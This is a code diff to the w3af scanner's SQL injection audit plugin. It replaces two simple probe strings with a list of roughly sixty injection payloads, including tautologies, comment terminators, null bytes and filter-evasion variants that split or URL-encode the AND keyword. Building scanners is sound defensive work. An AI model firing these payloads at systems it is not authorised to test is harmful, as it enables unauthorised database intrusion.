@@ -25,6 +25,7 @@ import w3af.core.data.constants.severity as severity
 
 from w3af.core.controllers.plugins.audit_plugin import AuditPlugin
 from w3af.core.data.fuzzer.fuzzer import create_mutants
+from w3af.core.data.fuzzer.utils import rand_number
 from w3af.core.data.esmre.multi_re import multi_re
 from w3af.core.data.esmre.multi_in import multi_in
 from w3af.core.data.kb.vuln import Vuln
@@ -158,9 +159,63 @@ class sqli(AuditPlugin):
     # Note that these payloads are similar but they do generate different errors
     # depending on the SQL query context they are used. Removing one or the
     # other will lower our SQLMap testenv coverage
-    SQLI_STRINGS = (u"a'b\"c'd\"",
-                    u"1'2\"3")
-
+    SQLI_STRINGS = [u" anD RANDOMIZE='",
+                    u" anD RANDOMIZE='--",
+                    u" anD RANDOMIZE='#",
+                    u" anD RANDOMIZE='/*",
+                    u" anD RANDOMIZE='%00",
+                    u" oR RANDOMIZE='",
+                    u"' anD RANDOMIZE=' anD '1'='1",
+                    u"' anD RANDOMIZE=' --",
+                    u"' anD RANDOMIZE=' #",
+                    u"' anD RANDOMIZE=' /*",
+                    u"' anD RANDOMIZE=' %00",
+                    u"') anD RANDOMIZE=' anD '1'='1",
+                    u"') anD RANDOMIZE=' --",
+                    u"') anD RANDOMIZE=' #",
+                    u"') anD RANDOMIZE=' /*",
+                    u"') anD RANDOMIZE=' %00",
+                    u"%' anD RANDOMIZE=' anD '%'='",
+                    u"%' anD RANDOMIZE=' --",
+                    u"%' anD RANDOMIZE=' #",
+                    u"%' anD RANDOMIZE=' /*",
+                    u"%' anD RANDOMIZE=' %00",
+                    u"%') anD RANDOMIZE=' anD '%'='",
+                    u"%') anD RANDOMIZE=' --",
+                    u"%') anD RANDOMIZE=' #",
+                    u"%') anD RANDOMIZE=' /*",
+                    u"%') anD RANDOMIZE=' %00",
+                    u" aANDnD RANDOMIZE='",
+                    u" aANDnD RANDOMIZE='#",
+                    u" a/**/n/**/D RANDOMIZE='",
+                    u" a/**/n/**/D RANDOMIZE='#",
+                    u" %61%6e%44 RANDOMIZE='",
+                    u" %61%6e%44 RANDOMIZE='#",
+                    u"' aANDnD RANDOMIZE=' aANDnD '1'='1",
+                    u"' aANDnD RANDOMIZE=' #",
+                    u"' a/**/n/**/D RANDOMIZE=' a/**/n/**/D '1'='1",
+                    u"' a/**/n/**/D RANDOMIZE=' #",
+                    u"' %61%6e%44 RANDOMIZE=' %61%6e%44 '1'='1",
+                    u"' %61%6e%44 RANDOMIZE=' #",
+                    u"') aANDnD RANDOMIZE=' aANDnD '1'='1",
+                    u"') aANDnD RANDOMIZE=' #",
+                    u"') a/**/n/**/D RANDOMIZE=' a/**/n/**/D '1'='1",
+                    u"') a/**/n/**/D RANDOMIZE=' #",
+                    u"') %61%6e%44 RANDOMIZE=' %61%6e%44 '1'='1",
+                    u"') %61%6e%44 RANDOMIZE=' #",
+                    u"%' aANDnD RANDOMIZE=' aANDnD",
+                    u"%' aANDnD RANDOMIZE=' #",
+                    u"%' a/**/n/**/D RANDOMIZE=' a/**/n/**/D '%'='",
+                    u"%' a/**/n/**/D RANDOMIZE=' #",
+                    u"%' %61%6e%44 RANDOMIZE=' %61%6e%44 '%'='",
+                    u"%' %61%6e%44 RANDOMIZE=' #",
+                    u"%') aANDnD RANDOMIZE=' aANDnD '%'='",
+                    u"%') aANDnD RANDOMIZE=' #",
+                    u"%') a/**/n/**/D RANDOMIZE=' a/**/n/**/D '%'='",
+                    u"%') a/**/n/**/D RANDOMIZE=' #",
+                    u"%') %61%6e%44 RANDOMIZE=' %61%6e%44 '%'='",
+                    u"%') %61%6e%44 RANDOMIZE=' #",
+                    u" anD RANDOMIZE='"]
     SQLI_MESSAGE = (u'A SQL error was found in the response supplied by '
                     u'the web application, the error is (only a fragment is '
                     u'shown): "%s". The error was found on response with id'
@@ -175,8 +230,8 @@ class sqli(AuditPlugin):
 
         :param freq: A FuzzableRequest
         """
-        mutants = create_mutants(freq, self.SQLI_STRINGS, orig_resp=orig_response)
-
+        sqli_str = [replace_randomize(i,2) for i in self.SQLI_STRINGS]
+        mutants = create_mutants(freq, sqli_str, orig_resp=orig_response)
         self._send_mutants_in_threads(self._uri_opener.send_mutant,
                                       mutants,
                                       self._analyze_result)
@@ -234,3 +289,7 @@ class sqli(AuditPlugin):
         plugin sends the string d'z"0 to every injection point, and searches
         for SQL errors in the response body.
         """
+
+def replace_randomize(data, length=0, exclude_numbers=[]):
+    rand_num = rand_number(length,exclude_numbers)
+    return data.replace("RANDOMIZE", rand_num)
